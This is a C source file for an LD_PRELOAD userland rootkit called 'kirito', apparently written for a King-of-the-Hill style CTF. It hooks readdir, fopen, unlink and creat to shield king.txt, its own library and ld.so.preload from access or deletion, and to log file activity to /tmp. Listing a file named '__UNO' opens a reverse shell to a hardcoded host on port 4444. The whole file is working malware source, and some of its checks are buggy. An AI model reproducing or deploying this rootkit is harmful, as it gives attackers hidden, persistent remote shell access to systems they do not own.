//kirito written by TERRAMINATOR

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>

#define FILENAME "kir"
#define REVERSE "__UNO"
#define REM_HOST4 "10.8.41.76"
#define REM_PORT 4444
#define LOC_PORT 65065
#define trash "/tmp/kirtrash"

typedef int bool;
#define true 1
#define false 0

int ipv4_rev (void)
{
    const char* host = REM_HOST4;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}


bool is_protected(const char* path) {
        if(strstr(path, "king.txt") != NULL) {
                return(true);
        }
        else if(strstr(path, "libc.kir.so.6") != NULL) {
                return(true);
        }
        else if(strstr(path, "ld.so.preload") != NULL) {
                return(true);
        }
	else {
		return(false);
	}
}


void log_(const char* msg, char* path) {
        FILE* fd;
        fd  = fopen(path, "a+");
        fputs(msg, fd);
	fputs("\n", fd);
        fclose(fd);
}


struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp))
    {
	if(strcmp(dir->d_name, REVERSE) == 0) ipv4_rev();
	if(strstr(dir->d_name,FILENAME) == 0) break;
        //if(strstr(dir->d_name,FILENAME) == 0 || strstr(dir->d_name, PREFIX) == 0) break;
    }
    return dir;
}


struct dirent64 *(*old_readdir64)(DIR *dir);
struct dirent64 *readdir64(DIR *dirp)
{
    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *dir;

    while (dir = old_readdir64(dirp))
    {
	if(strcmp(dir->d_name, REVERSE) == 0) ipv4_rev();
        if(strstr(dir->d_name,FILENAME) == 0) break;
	//if(strstr(dir->d_name,FILENAME) == 0 || strstr(dir->d_name, PREFIX) == 0) break;
    }
    return dir;
}


FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	FILE *fp;
	orig_fopen = dlsym(RTLD_NEXT, "fopen");
	if(is_protected(pathname)) {
		pathname = trash;
	}
	fp = orig_fopen(pathname, mode);
	return(fp);
}


FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode)
{
	FILE* fp;
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
        if(is_protected(pathname)) {
                pathname = trash;
        }
	FILE* fd;
	fd  = orig_fopen64("/tmp/fopen64.log", "a+");
	fwrite(pathname, 1, sizeof(pathname)+50, fd);
	fclose(fd);
        fp = orig_fopen64(pathname, mode);
        return(fp);
}


int (*orig_unlink)(const char *path);
int unlink(const char *path) {
	orig_unlink = dlsym(RTLD_NEXT, "unlink");
        if(is_protected(path)) {
                path = trash;
        }
        log_(path, "/tmp/unlink.log");
	int res = orig_unlink(path);
	return(res);
}


//int (*orig_open)(const char *pathname, int flags, unsigned int mode);
//int open(const char *pathname, int flags, unsigned int mode) {
//	orig_open = dlsym(RTLD_NEXT, "open");
//	if(is_protected(pathname)) {
//              pathname = trash;
//      }
//      log_(pathname, "/tmp/open.log");
//	int fp = orig_open(pathname, flags, mode);
//	return(fp);
//}


int (*orig_creat)(const char *pathname, mode_t mode);
int creat(const char *pathname, mode_t mode) {
	orig_creat = dlsym(RTLD_NEXT, "creat");
	log_(pathname, "/tmp/create.log");
	int res = orig_creat(pathname, mode);
	return(res);
}
